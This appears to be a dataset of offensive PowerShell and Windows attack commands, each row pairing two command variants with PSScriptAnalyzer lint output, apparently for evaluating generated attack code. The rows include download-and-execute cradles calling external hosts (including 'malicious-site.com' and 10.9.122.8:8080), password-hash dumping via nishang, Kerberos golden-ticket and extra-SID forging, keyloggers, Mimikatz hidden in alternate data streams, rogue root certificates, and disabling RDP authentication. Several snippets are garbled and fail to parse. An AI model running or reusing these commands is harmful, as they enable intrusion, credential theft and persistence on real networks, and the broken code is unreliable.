$cert = ${path} ; MoveTo-Storage -Path $cert,"$cert = Import-Certificate -FilePath ${pfx_path} -CertStoreLocation Cert:\LocalMachine\My ; Move-Item -Path $cert.PSPath -Destination ""Cert:\LocalMachine\Root""",[''],[''],[''],[''],[''],['']
Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${MSIPayload}' },Invoke-CimMethod -ClassName Win32_Product -MethodName ${action} -Arguments @{ PackageLocation = '${msi_Payload}' },[''],[''],[''],[''],[''],['']
Invoke-ExecuteMSBuild -Execute 'iex(New-Object Net.WebClient).DownloadString('http://www.getyourpowershellhere.com/payload')',Invoke-ExecuteMSBuild,[''],[''],[''],[''],[''],['']
$process = Get-Process -Name 'cmd.exe' ; Invoke-TokenManipulation -CreateProcess $process.id,Get-Process wininit | Invoke-TokenManipulation -CreateProcess 'cmd.exe',[''],[''],[''],[''],[''],['']
Get-Domain,Get-Domain,[''],[''],[''],[''],[''],['']
lookupsid.py < child_domain>/username@10.10.10.10 | hash-childitem -child_domain ${child_domain} -root_id ${root_id},ticketer.py -nthash < krbtgt_hash> -domain < child_domain> -domain-sid < child_domain_sid> -extra-sid < root_domain_sid> Administrator,['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError'],"['RedirectionNotSupported ', ' RedirectionNotSupported ', ' RedirectionNotSupported ', ' RedirectionNotSupported ']","[""The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. "", "" The '<' operator is reserved for future use. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError']"
gci HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name 'password' -Value 'sensitive',"$pattern = ""password"";$hives = ""HKEY_CLASSES_ROOT"",""HKEY_CURRENT_USER"",""HKEY_LOCAL_MACHINE"",""HKEY_USERS"",""HKEY_CURRENT_CONFIG"";foreach ($r in $hives) { gci ""registry::${r}\"" -rec -ea SilentlyContinue | sls ""$pattern"" };foreach ($r in $hives) { gci ""registry::${r}\"" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match ""$pattern"") { $_.PsPath; $_ | out-string -stream | sls ""$pattern"" }}}",['PSAvoidUsingCmdletAliases '],"[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],"['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'sls' is an alias of 'Select-String'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" '%' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gp' is an alias of 'Get-ItemProperty'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'sls' is an alias of 'Select-String'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning ', ' Warning']"
Get-PSSession -Name doublehopsess -RunAsCredential domain_name\username,Enter-PSSession -ConfigurationName doublehopsess -ComputerName < pc_name> -Credential domain_name\username,[''],[''],[''],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
$o = 'Get'; $b = 'Process'; $cmd = $o + '-' + $b; Invoke-Expression $cmd,$originalString = 'SensitiveCommand'; $obfuscatedString = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); InvokeExpression $decodedString,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
nishang.exe -dump localpassword,"iex(iwr(""https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1""));Get-PassHashes",[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'iwr' is an alias of 'Invoke-WebRequest'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning']"
$renamed = 'Get-Process'; Set-Alias -Name $renamed -Value Get-ChildItem; Invoke-Expression $renamed,Function MyGetProc { Get-Process }; MyGetProc,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap,Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap,[''],[''],[''],[''],[''],['']
"Get-ADPrincipal -Instance ""dcorp-mssql.dollarcorp.moneycorp.local""","Invoke-SQLEscalatePriv -Verbose -Instance ""SQLServer1\Instance1""",[''],[''],[''],[''],[''],['']
Get-GPO -ClassName win32_operatingsystem | select * | more,Get-NetGPO -GPOName '{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}',['PSAvoidUsingCmdletAliases '],"[""'select' is an alias of 'Select-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],[''],[''],['']
$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.txt,$path = 'C:\temp\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path,['UnexpectedToken '],"[""Unexpected token '\\T1056.001\\src\\Get-Keystrokes.txt' in expression or statement. ""]",['ParseError'],[''],[''],['']
netsh http show full,netsh interface portproxy add v4tov4 listenport=5446 listenaddress=10.35.8.17 connectport=5985 connectaddress=10.35.8.23,[''],[''],[''],[''],[''],['']
"gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern 'password'","gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern ""password""",['PSAvoidUsingCmdletAliases '],"[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],['PSAvoidUsingCmdletAliases '],"[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname,Find-DomainShare -CheckShareAccess,[''],[''],[''],[''],[''],['']
gpresult /R,"$net = ""10.10.1."";0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace(""\s+"","""").replace(""`r"","""").replace(""`n"","" ""); Write-Output ""$net$_ $r""} | tee ip_hostname.txt",[''],[''],[''],"['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'foreach' is an alias of 'ForEach-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'ft' is an alias of 'Format-Table'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'tee' is an alias of 'Tee-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning ', ' Warning']"
"Get-DomainController -Identity ""Administrator"" -Verbose",raiseChild.py -target-exec 10.10.10.10 <child_domain>/username,[''],[''],[''],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
"$shared = New-SmbShare -Name ""sharedir"" -Force","new-item ""c:\users\public\share"" -itemtype directory;New-SmbShare -Name ""sharedir"" -Path ""C:\users\public\share"" -FullAccess ""Everyone"",""Guests"",""Anonymous Logon""",['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'shared' is assigned but never used. ""]",['Warning'],[''],[''],['']
$data = Get-Content; Invoke-Expression $data,$content = 'Invoke-Mimikatz'; $file = 'C:\temp\normal.txt'; $stream = 'C:\temp\normal.txt:hidden'; SetContent -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; GetContent -Path $stream,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
gpresult /R,([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value,[''],[''],[''],[''],[''],['']
$o = 'Get'; $b = 'Process'; $cmd = $o + '-' + $b; Invoke-Expression $cmd,$path = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz')); Invoke-Item $path,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],[''],[''],['']
$content = Get-Content; Invoke-Expression $content,$code = [System.IO.File]::ReadAllText('C:\temp\script.ps1'); Invoke-Expression $code,['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"(Get-WmiObject -Class ""Win32_TerminalServiceSetting"" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)","(Get-WmiObject -class ""Win32_TSGeneralSetting"" -Namespace root\cimv2\terminalservices -Filter ""TerminalName='RDP-tcp'"").SetUserAuthenticationRequired(0)",['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning']
"Get-ForestGlobalCatalog -Forest external.domain ; Get-DomainTrust -SearchBase ""GC://$($ENV:USERDNSDOMAIN)""",Get-ForestGlobalCatalog,[''],[''],[''],[''],[''],['']
Invoke-Keystrokes -CheckAll,"Add-Type -TypeDefinition @"" using System; using System.Runtime.InteropServices; public class KeyLogger { [DllImport(""user32.dll"")] public static extern int GetAsyncKeyState(Int32 i); } ""@ while ($true) { Start-Sleep -Milliseconds 100 for ($i = 8; $i -le 190; $i++) { if ([KeyLogger]::GetAsyncKeyState($i) eq -32767) { $Key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i) Write-Host $Key } } }",[''],[''],[''],"['UnexpectedCharactersAfterHereStringHeader ', ' MissingEndParenthesisInExpression ', ' MissingEndCurlyBrace ', ' UnexpectedToken ', ' UnexpectedToken ', ' MissingEndParenthesisAfterStatement ', ' MissingEndCurlyBrace ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' UnexpectedToken ', ' PSAvoidUsingPositionalParameters ']","['No characters are allowed after a here-string header but before the end of the line. ', "" Missing closing ')' in expression. "", "" Missing closing '}' in statement block or type definition. "", "" Unexpected token ')' in expression or statement. "", "" Unexpected token 'eq' in expression or statement. "", "" Missing closing ')' after expression in 'if' statement. "", "" Missing closing '}' in statement block or type definition. "", "" Unexpected token ')' in expression or statement. "", "" Unexpected token 'Write-Host' in expression or statement. "", "" Unexpected token '}' in expression or statement. "", "" Unexpected token '}' in expression or statement. "", "" Cmdlet 'Add-Type' has positional parameter. Please use named parameters instead of positional parameters when calling a command. ""]","['ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' ParseError ', ' Information']"
"$code = 'Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/malicious-code.ps1')""","Add-Type -TypeDefinition 'using System; public class MyClass { public static void Run() { Console.WriteLine(""Executed""); } }'; [MyClass]::Run()","['TerminatorExpectedAtEndOfString ', ' UnexpectedToken ', ' PSUseDeclaredVarsMoreThanAssignments ']","[""The string is missing the terminator: '. "", ' Unexpected token \'http://malicious-site.com/malicious-code.ps1\')""\' in expression or statement. ', "" The variable 'code' is assigned but never used. ""]","['ParseError ', ' ParseError ', ' Warning']",[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command ""Invoke-AzplhG9txdFhS9n""",powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://10.9.122.8:8080/AZPLhG9txdFhS9n');,[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"(Get-WmiObject -Class ""Win32_TerminalServiceSetting"" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)","Get-NetFirewallRule -DisplayGroup ""Remote Desktop"" | Set-NetFirewallRule -Enabled True",['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],[''],[''],['']
Get-SQLInstanceDomain | Get-SQLConnectionTest | Test-SQLConnectionTestInfo -Verbose,"Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq ""Accessible"" } | Get-SQLServerInfo",[''],[''],[''],['PSAvoidUsingCmdletAliases '],"[""'?' is an alias of 'Where-Object'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
